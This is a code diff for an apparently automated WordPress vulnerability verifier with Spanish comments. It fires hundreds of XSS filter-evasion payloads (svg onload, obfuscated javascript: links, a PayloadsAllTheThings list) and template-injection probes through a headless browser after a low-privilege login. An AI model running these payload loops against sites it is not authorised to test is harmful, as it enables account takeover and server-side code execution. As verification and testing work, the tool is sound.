@@ -483,6 +483,90 @@ def _xss_render(base_url: str, endpoint: str, method: str, params: dict, cookies
             pass
 
 
+class _XssBrowserSession:
+    """Reusa UN SOLO Chromium headless (Playwright) a lo largo de muchos intentos, en vez de
+    arrancar un proceso de navegador por cada payload -- confirmado en vivo que, con las ~500
+    variantes de xss_alert_identifiable.txt (ver payload_kb.py) sumadas a las elegidas a mano, un
+    `with sync_playwright() as pw: browser = pw.chromium.launch()` POR INTENTO (el patron
+    original de _xss_render) tardaba minutos; el arranque del propio Chromium es el coste real,
+    no la navegacion entre paginas. Tambien evita gastar tiempo en page.screenshot() para cada
+    intento fallido -- solo se captura cuando `capture=True` (el intento ganador)."""
+
+    def __enter__(self):
+        from playwright.sync_api import sync_playwright
+        self._pw_cm = sync_playwright()
+        self._pw = self._pw_cm.__enter__()
+        # el paquete pip de Playwright instalado puede pedir una revision de Chromium distinta
+        # de la que este sandbox trae pre-instalada (confirmado en vivo: "chromium_headless_
+        # shell-1248" no existe, solo la 1194) -- channel/executablePath explicito al binario
+        # 'chromium' completo (no el headless_shell, que es el que falta) evita que Playwright
+        # intente descargar nada.
+        launch_kwargs = {"headless": True, "args": ["--no-sandbox"]}
+        chromium_path = "/opt/pw-browsers/chromium"
+        if os.path.exists(chromium_path):
+            launch_kwargs["executable_path"] = chromium_path
+        self._browser = self._pw.chromium.launch(**launch_kwargs)
+        return self
+
+    def __exit__(self, *exc):
+        try:
+            self._browser.close()
+        except Exception:
+            pass
+        try:
+            self._pw_cm.__exit__(*exc)
+        except Exception:
+            pass
+        return False
+
+    def render(self, base_url: str, endpoint: str, method: str, params: dict, cookies: list,
+              timeout_ms: int = 15000, capture: bool = False):
+        """Misma semantica que _xss_render (navega, devuelve (title, png)) pero sobre el
+        navegador YA arrancado -- `png` es None salvo que `capture=True`."""
+        import html as _html
+        from urllib.parse import quote, urlencode
+        try:
+            ctx = self._browser.new_context(viewport={"width": 1280, "height": 900})
+            try:
+                if cookies:
+                    ctx.add_cookies(cookies)
+                page = ctx.new_page()
+                if method == "GET":
+                    url = base_url + endpoint + ("&" if "?" in endpoint else "?") + urlencode(params)
+                    page.goto(url, wait_until="load", timeout=timeout_ms)
+                else:
+                    inputs = "".join(
+                        f'<input type="hidden" name="{_html.escape(str(k))}" '
+                        f'value="{_html.escape(str(v))}">' for k, v in params.items())
+                    form_html = (f'<html><body><form id="f" method="POST" '
+                                f'action="{base_url + endpoint}">{inputs}</form>'
+                                f'<script>document.getElementById("f").submit()</script>'
+                                f'</body></html>')
+                    page.goto("data:text/html," + quote(form_html), timeout=timeout_ms)
+                page.wait_for_timeout(400)
+                title = page.title()
+                png = None
+                if capture:
+                    import base64
+                    import tempfile
+                    fd, out_path = tempfile.mkstemp(suffix=".png")
+                    os.close(fd)
+                    try:
+                        page.screenshot(path=out_path, full_page=True)
+                        with open(out_path, "rb") as f:
+                            png = base64.b64encode(f.read()).decode("ascii")
+                    finally:
+                        try:
+                            os.unlink(out_path)
+                        except OSError:
+                            pass
+                return title, png
+            finally:
+                ctx.close()
+        except Exception:
+            return None, None
+
+
 def _wp_login(base_url: str, user: str, password: str, timeout: float = 15.0):
     """Login real por cookie de WordPress (wp-login.php). Devuelve una requests.Session logueada,
     o None si no hay cookie de sesion (login fallido). Requiere la libreria `requests` (pwntools ya
@@ -1754,33 +1838,45 @@ def verify_wordpress_xss(
             f"<svg/onload=\"{js}\">",
             f"<a href=\"jav&#x09;ascript:{js}\">x</a>",
         ]
+        # ademas de los anteriores (rotura de contexto elegida a mano), TODAS las variantes
+        # generalizables de xss_alert_identifiable.txt en PayloadsAllTheThings (cientos de
+        # vectores de evasion de filtro reales -- \xNN entre tag/atributo, handlers poco
+        # comunes, trucos de entidades) con su alert(NNNN) fijo sustituido por este mismo `js`.
+        from .payload_kb import load_xss_payloads
+        attempts += load_xss_payloads(js)
 
         m = (http_method or "GET").upper()
         found = False
         tried = []
-        for payload_value in attempts:
-            params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
-            params[xss_param] = payload_value
-            step(f"probando {m} {endpoint} con {xss_param}={payload_value!r} (navegador real)...")
-            title, png = _xss_render(boot.base_url, endpoint, m, params, cookies)
-            tried.append({"payload": payload_value, "title_resultante": title})
-            if title == marker:
-                found = True
-                res.evidence["payload_ganador"] = payload_value
-                step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
-                     f"cambio exactamente a '{marker}'.")
-                if png:
-                    boot.shots.append({
-                        "caption_es": (f"Paso 5: XSS confirmado -- el navegador REAL ejecuto el "
-                                      f"script inyectado en '{xss_param}', cambiando document.title "
-                                      f"al marcador '{marker}' (no es texto reflejado, es codigo JS "
-                                      f"ejecutandose)."),
-                        "caption_en": (f"Step 5: XSS confirmed -- the REAL browser executed the "
-                                      f"script injected in '{xss_param}', changing document.title "
-                                      f"to the marker '{marker}' (not reflected text, actual JS "
-                                      f"running)."),
-                        "png_b64": png, "url": boot.base_url + endpoint})
-                break
+        # UN SOLO navegador para los ~500+ intentos (ver _XssBrowserSession): arrancar un
+        # Chromium por payload, confirmado en vivo, tarda minutos -- el coste real es el arranque
+        # del propio navegador. Tambien se captura pantalla SOLO del intento ganador (un segundo
+        # render con capture=True), no de cada intento fallido.
+        step(f"arrancando Chromium headless (se reutiliza para los {len(attempts)} intentos)...")
+        with _XssBrowserSession() as xb:
+            for payload_value in attempts:
+                params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                params[xss_param] = payload_value
+                title, _ = xb.render(boot.base_url, endpoint, m, params, cookies)
+                tried.append({"payload": payload_value, "title_resultante": title})
+                if title == marker:
+                    found = True
+                    res.evidence["payload_ganador"] = payload_value
+                    step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
+                         f"cambio exactamente a '{marker}'.")
+                    _, png = xb.render(boot.base_url, endpoint, m, params, cookies, capture=True)
+                    if png:
+                        boot.shots.append({
+                            "caption_es": (f"Paso 5: XSS confirmado -- el navegador REAL ejecuto el "
+                                          f"script inyectado en '{xss_param}', cambiando document.title "
+                                          f"al marcador '{marker}' (no es texto reflejado, es codigo JS "
+                                          f"ejecutandose)."),
+                            "caption_en": (f"Step 5: XSS confirmed -- the REAL browser executed the "
+                                          f"script injected in '{xss_param}', changing document.title "
+                                          f"to the marker '{marker}' (not reflected text, actual JS "
+                                          f"running)."),
+                            "png_b64": png, "url": boot.base_url + endpoint})
+                    break
         res.evidence.update({"login_bajo_privilegio": boot.sub_user,
                              "login_bajo_privilegio_password": boot.sub_pass,
                              "xss_param": xss_param, "token": token, "metodo": m,
@@ -1859,6 +1955,11 @@ def verify_wordpress_ssti(
             # value="..."  dentro de una plantilla que luego evalua su propio contenido)
             f"\">{{{{{mul}}}}}<\"",
         ]
+        # ademas de las anteriores (sintaxis elegida a mano), TODAS las plantillas aritmeticas
+        # generalizables de ssti.fuzz en PayloadsAllTheThings -- cada una trae su propio resultado
+        # esperado (la mayoria son a*b, pero @() de ASP classic usa a+b, sintaxis distinta).
+        from .payload_kb import load_ssti_arithmetic_payloads
+        attempt_pairs = [(p, expected) for p in attempts] + load_ssti_arithmetic_payloads(a, b)
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
             "ssti_param": ssti_param, "a": a, "b": b, "producto_esperado": expected,
@@ -1866,10 +1967,10 @@ def verify_wordpress_ssti(
         })
 
         m = (http_method or "GET").upper()
-        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
         found = False
         tried = []
-        for payload_value in attempts:
+        for payload_value, payload_expected in attempt_pairs:
+            pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
             payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
             payload[ssti_param] = payload_value
             step(f"probando {m} {endpoint} con {ssti_param}={payload_value!r}...")
@@ -1886,9 +1987,10 @@ def verify_wordpress_ssti(
             if matched:
                 found = True
                 res.evidence["payload_ganador"] = payload_value
+                res.evidence["resultado_esperado_ganador"] = payload_expected
                 res.evidence["status_code_respuesta"] = resp.status_code
                 res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
-                step(f"VERIFICADO: la respuesta contiene {expected} (={a}*{b}), calculado por el "
+                step(f"VERIFICADO: la respuesta contiene {payload_expected}, calculado por el "
                      f"motor de plantillas -- ese numero no aparece en el payload enviado.")
                 step("capturando pantalla: la respuesta HTTP con el producto calculado por el "
                      "motor de plantillas (prueba final)...")
@@ -1897,12 +1999,12 @@ def verify_wordpress_ssti(
                            + f"{ssti_param}={payload_value}") if m == "GET" else None
                 if shot_url:
                     boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
-                           f"Paso 5: SSTI confirmada -- la respuesta contiene {expected} "
-                           f"(={a}*{b}), que solo pudo calcularse evaluando codigo en el motor de "
-                           f"plantillas, no reflejando el payload enviado.",
-                           f"Step 5: SSTI confirmed -- the response contains {expected} "
-                           f"(={a}*{b}), which could only come from the template engine "
-                           f"evaluating code, not from reflecting the sent payload.")
+                           f"Paso 5: SSTI confirmada -- la respuesta contiene {payload_expected}, "
+                           f"que solo pudo calcularse evaluando codigo en el motor de plantillas, "
+                           f"no reflejando el payload enviado.",
+                           f"Step 5: SSTI confirmed -- the response contains {payload_expected}, "
+                           f"which could only come from the template engine evaluating code, not "
+                           f"from reflecting the sent payload.")
                 break
         res.evidence["intentos"] = tried
         if found:
@@ -1910,15 +2012,16 @@ def verify_wordpress_ssti(
             res.ok = True
             res.detail = (f"SSTI confirmada: la peticion con {ssti_param}="
                           f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
-                          f"EVALUARA {a}*{b} y devolviera {expected} en la respuesta -- prueba "
-                          f"inequivoca de evaluacion de codigo en servidor (el payload enviado no "
-                          f"contiene el numero {expected} en ningun punto)")
+                          f"EVALUARA la expresion y devolviera {res.evidence['resultado_esperado_ganador']} "
+                          f"en la respuesta -- prueba inequivoca de evaluacion de codigo en "
+                          f"servidor (ese numero no esta en ningun punto del payload enviado)")
         else:
             res.ok = True
-            res.detail = (f"se probaron {len(tried)} sintaxis de plantilla para {ssti_param} y "
-                          f"ninguna produjo el producto esperado ({a}*{b}={expected}) en la "
-                          f"respuesta -- el SSTI no se confirmo (puede necesitar otra sintaxis de "
-                          f"motor, o el endpoint/parametro no son los reales)")
+            res.detail = (f"se probaron {len(tried)} sintaxis de plantilla para {ssti_param} "
+                          f"(producto esperado {a}*{b}={expected}, mas las plantillas aditivas) y "
+                          f"ninguna produjo el resultado esperado en la respuesta -- el SSTI no "
+                          f"se confirmo (puede necesitar otra sintaxis de motor, o el "
+                          f"endpoint/parametro no son los reales)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
